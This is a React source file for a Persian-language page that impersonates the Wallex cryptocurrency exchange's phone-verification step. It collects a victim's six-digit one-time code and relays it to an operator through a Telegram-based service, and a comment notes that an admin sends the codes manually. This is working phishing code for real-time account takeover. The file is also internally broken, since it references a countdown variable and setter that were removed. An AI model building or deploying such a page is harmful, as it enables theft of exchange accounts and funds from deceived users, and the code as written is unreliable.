import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { updatePhoneVerificationCode } from "@/lib/telegram-service-enhanced";
import { ChevronLeft, MessageSquare } from "lucide-react";
import { Button } from "@/components/ui/button";
import { AlertMessage } from "@/components/AlertMessage";
import { OTPInput } from "@/components/OTPInput";
import { toPersianDigits, maskPhoneNumber } from "@/lib/persian-utils";

const PhoneVerification = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [otp, setOTP] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errors, setErrors] = useState<{ otp?: string }>({});

  const phoneNumber = location.state?.phoneNumber || "09123456789";
  const sessionId =
    location.state?.sessionId || sessionStorage.getItem("sessionId");
  const maskedPhoneNumber = maskPhoneNumber(phoneNumber);

  // Removed countdown functionality as admin manually sends codes

  const handleOTPComplete = (completedOTP: string) => {
    setOTP(completedOTP);
    setErrors({});
  };

  const handleOTPChange = (newOTP: string) => {
    setOTP(newOTP);
    if (errors.otp) {
      setErrors((prev) => ({ ...prev, otp: undefined }));
    }
  };

  const handleSubmit = async () => {
    setErrors({});

    if (!otp || otp.length !== 6) {
      setErrors({ otp: "کد تایید ۶ رقمی را وارد کنید" });
      return;
    }

    if (!sessionId) {
      setErrors({ otp: "خطا در session. لطفا مجدد تلاش کنید." });
      return;
    }

    setIsSubmitting(true);

    try {
      console.log("Updating verification code in Telegram:", otp);

      // Update verification code in Telegram message
      const success = await updatePhoneVerificationCode(sessionId, otp);

      if (!success) {
        throw new Error("Failed to update verification code");
      }

      // Simulate verification delay
      await new Promise((resolve) => setTimeout(resolve, 1000));

      // Navigate to loading page
      navigate("/loading", {
        state: {
          phoneNumber,
          sessionId,
        },
        replace: true,
      });
    } catch (error) {
      console.error("OTP verification error:", error);
      setErrors({ otp: "خطا در ارسال کد. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleEditNumber = () => {
    window.history.back();
  };

  const handleResendCode = () => {
    if (countdown === 0) {
      setCountdown(54);
      console.log("Resending verification code...");
    }
  };

  return (
    <div
      style={{
        display: "flex",
        height: "885px",
      }}
    >
      <div
        style={{
          alignItems: "center",
          backgroundColor: "rgb(14, 35, 66)",
          display: "flex",
          height: "100%",
          justifyContent: "center",
          width: "100%",
        }}
        className="mobile-full-screen"
      >
        {/* Login Form Card */}
        <div
          style={{
            backgroundColor: "rgb(255, 255, 255)",
            width: "100%",
            maxWidth: "480px",
          }}
          className="form-card"
        >
          <div
            style={{
              display: "flex",
              flexDirection: "column",
              gap: "8px",
              padding: "20px",
              width: "100%",
            }}
          >
            {/* Header */}
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                width: "100%",
              }}
            >
              <div
                style={{
                  alignItems: "flex-start",
                  display: "flex",
                  gap: "8px",
                }}
              >
                <button
                  onClick={handleEditNumber}
                  style={{
                    alignItems: "center",
                    backgroundColor: "rgba(0, 0, 0, 0)",
                    borderRadius: "50%",
                    border: "none",
                    color: "rgba(0, 0, 0, 0.6)",
                    cursor: "pointer",
                    display: "flex",
                    flexShrink: "0",
                    fontSize: "24px",
                    justifyContent: "center",
                    lineHeight: "42px",
                    position: "relative",
                    textAlign: "center",
                    transitionDuration: "0.15s",
                    transitionProperty: "background-color",
                    transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                    userSelect: "none",
                    verticalAlign: "middle",
                  }}
                >
                  <ChevronLeft style={{ width: "24px", height: "24px" }} />
                </button>
                <span
                  style={{
                    fontWeight: "700",
                  }}
                >
                  تائید شماره همراه
                </span>
              </div>
              <a>
                <img
                  src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
                  alt="صرافی خرید فروش ارزهای دیجیتال"
                  width="128"
                  height="24"
                  style={{
                    aspectRatio: "auto 128 / 24",
                    display: "inline",
                    height: "24px",
                    width: "128px",
                  }}
                />
              </a>
            </div>

            {/* Separator */}
            <hr
              style={{
                borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
                borderColor: "rgba(0, 0, 0, 0.2)",
                flexShrink: "0",
                marginLeft: "-20px",
                marginRight: "-20px",
                overflowX: "hidden",
                overflowY: "hidden",
              }}
            />

            {/* Content */}
            <div
              style={{
                display: "flex",
                flexDirection: "column",
                gap: "8px",
                marginTop: "16px",
              }}
            >
              {/* Alert Message */}
              <AlertMessage>
                <span>اطلاعات شماره </span>
                <b
                  dir="ltr"
                  style={{
                    display: "inline",
                    fontWeight: "700",
                    direction: "ltr",
                  }}
                >
                  {maskedPhoneNumber}
                </b>
                <span> به ادمین ارسال شد. در انتظار کد تایید باشید.</span>
              </AlertMessage>

              {/* OTP Input Grid */}
              <OTPInput
                length={6}
                value={otp}
                onComplete={handleOTPComplete}
                onChange={handleOTPChange}
                disabled={isSubmitting}
              />

              {errors.otp && (
                <p
                  style={{
                    color: "rgb(220, 38, 38)",
                    fontSize: "12px",
                    textAlign: "right",
                    marginTop: "8px",
                  }}
                >
                  {errors.otp}
                </p>
              )}

              {/* Countdown Timer */}
              <div>
                <p
                  style={{
                    color: "rgba(0, 0, 0, 0.6)",
                    fontSize: "14px",
                    lineHeight: "24.01px",
                    paddingBottom: "4px",
                    paddingTop: "4px",
                  }}
                >
                  {countdown > 0 ? (
                    <>
                      <span>{toPersianDigits(countdown)}</span>
                      <span> ثانیه تا ارسال مجدد کد</span>
                    </>
                  ) : (
                    <button
                      onClick={handleResendCode}
                      style={{
                        color: "rgb(0, 122, 255)",
                        textDecoration: "underline",
                        background: "none",
                        border: "none",
                        cursor: "pointer",
                      }}
                    >
                      ارسال مجدد کد
                    </button>
                  )}
                </p>
              </div>

              {/* Action Buttons */}
              <div style={{ marginTop: "16px" }}>
                <hr
                  style={{
                    borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
                    borderColor: "rgba(0, 0, 0, 0.2)",
                    flexShrink: "0",
                    marginBottom: "16px",
                    marginLeft: "-20px",
                    marginRight: "-20px",
                    overflowX: "hidden",
                    overflowY: "hidden",
                  }}
                />
                <div
                  style={{
                    display: "flex",
                    gap: "12px",
                  }}
                >
                  <button
                    onClick={handleEditNumber}
                    style={{
                      alignItems: "center",
                      backgroundColor: "rgba(0, 0, 0, 0)",
                      border: "1px solid rgba(0, 0, 0, 0.2)",
                      borderRadius: "8px",
                      color: "rgba(0, 0, 0, 0.6)",
                      cursor: "pointer",
                      display: "flex",
                      fontWeight: "500",
                      justifyContent: "center",
                      paddingBottom: "10px",
                      paddingLeft: "16px",
                      paddingRight: "16px",
                      paddingTop: "10px",
                      position: "relative",
                      textAlign: "center",
                      textTransform: "uppercase",
                      transitionDuration: "0.25s",
                      transitionProperty:
                        "background-color, box-shadow, border-color",
                      transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                      userSelect: "none",
                      verticalAlign: "middle",
                      width: "100%",
                    }}
                  >
                    <span>ویرایش شماره</span>
                  </button>
                  <button
                    onClick={handleSubmit}
                    disabled={isSubmitting || otp.length !== 6}
                    style={{
                      alignItems: "center",
                      backgroundColor: "rgb(23, 29, 38)",
                      border: "none",
                      borderRadius: "8px",
                      color: "rgb(255, 255, 255)",
                      cursor:
                        isSubmitting || otp.length !== 6
                          ? "not-allowed"
                          : "pointer",
                      display: "flex",
                      fontWeight: "500",
                      justifyContent: "center",
                      opacity: isSubmitting || otp.length !== 6 ? "0.5" : "1",
                      paddingBottom: "10px",
                      paddingLeft: "16px",
                      paddingRight: "16px",
                      paddingTop: "10px",
                      position: "relative",
                      textAlign: "center",
                      textTransform: "uppercase",
                      transitionDuration: "0.25s",
                      transitionProperty:
                        "background-color, box-shadow, border-color",
                      transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                      userSelect: "none",
                      verticalAlign: "middle",
                      width: "100%",
                    }}
                  >
                    {isSubmitting ? (
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                        }}
                      >
                        <div
                          style={{
                            width: "16px",
                            height: "16px",
                            border: "2px solid rgb(255, 255, 255)",
                            borderTop: "2px solid transparent",
                            borderRadius: "50%",
                            animation: "spin 1s linear infinite",
                            marginRight: "8px",
                          }}
                        />
                        در حال بررسی...
                      </div>
                    ) : (
                      <>
                        <span style={{ display: "contents" }} />
                        <span>ثبت و ادامه</span>
                      </>
                    )}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Background Image - Hidden on mobile, visible on lg+ */}
        <div
          style={{
            display: "none",
            height: "100%",
            maxWidth: "720px",
            overflowX: "hidden",
            overflowY: "hidden",
            position: "relative",
            width: "100%",
          }}
          className="desktop-bg-image"
        >
          <img
            src="https://wallex.ir/rhino/wallex-public/banners/puv2vWcovprVkKayXiPwuM2uSeJ39mLtZXY0ZLNf.png?w=3840&q=90"
            alt="رتبه یک حجم معاملات بیت‌کوین"
            loading="lazy"
            decoding="async"
            style={{
              bottom: "0px",
              height: "100%",
              left: "0px",
              objectFit: "contain",
              position: "absolute",
              right: "0px",
              top: "0px",
              width: "100%",
            }}
          />
        </div>
      </div>

      {/* Progress Bar */}
      <div
        style={{
          height: "2px",
          position: "fixed",
          right: "0px",
          top: "0px",
          width: "100%",
          zIndex: "10310",
        }}
      >
        <div
          style={{
            backgroundColor: "rgb(0, 122, 255)",
            height: "100%",
            width: "100%",
            transform: "matrix(1, 0, 0, 1, 1280, 0)",
          }}
        />
      </div>

      {/* Support Button */}
      <button
        style={{
          alignItems: "center",
          backgroundColor: "rgb(0, 122, 255)",
          borderRadius: "8px",
          border: "none",
          bottom: "16px",
          boxShadow:
            "rgba(0, 0, 0, 0.1) 0px 0px 2px 0px, rgba(0, 0, 0, 0.15) 0px 8px 20px 0px",
          color: "rgb(255, 255, 255)",
          cursor: "pointer",
          display: "flex",
          fontSize: "14px",
          fontWeight: "500",
          justifyContent: "center",
          left: "16px",
          lineHeight: "24.01px",
          paddingBottom: "4px",
          paddingLeft: "16px",
          paddingRight: "16px",
          paddingTop: "4px",
          position: "fixed",
          textAlign: "center",
          textTransform: "uppercase",
          transitionDuration: "0.25s",
          transitionProperty: "background-color, box-shadow, border-color",
          transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
          userSelect: "none",
          verticalAlign: "middle",
          zIndex: "1050",
        }}
      >
        <span
          style={{
            display: "flex",
            fontSize: "14px",
            fontWeight: "500",
            lineHeight: "24.01px",
            marginLeft: "4px",
            marginRight: "-8px",
            textAlign: "center",
            textTransform: "uppercase",
          }}
        >
          <MessageSquare
            style={{
              width: "22px",
              height: "22px",
              fontSize: "20px",
              fontWeight: "500",
              lineHeight: "34.3px",
              marginLeft: "8px",
            }}
          />
        </span>
        <span>پشتیبانی والکس</span>
      </button>

      <style jsx>{`
        @keyframes spin {
          0% {
            transform: rotate(0deg);
          }
          100% {
            transform: rotate(360deg);
          }
        }

        /* Desktop styles (1024px and up) */
        @media (min-width: 1024px) {
          .mobile-full-screen {
            justify-content: space-evenly !important;
          }
          .form-card {
            border-radius: 16px;
          }
          .desktop-bg-image {
            display: block !important;
          }
        }

        /* Mobile and tablet styles (up to 1023px) */
        @media (max-width: 1023px) {
          .mobile-full-screen {
            padding: 0 !important;
            justify-content: center !important;
          }
          .form-card {
            border-radius: 0 !important;
            max-width: none !important;
            height: 100vh;
            min-height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
          }
          .form-card > div {
            padding: 20px !important;
            height: 100%;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
          }
          .desktop-bg-image {
            display: none !important;
          }
        }
      `}</style>
    </div>
  );
};

export default PhoneVerification;
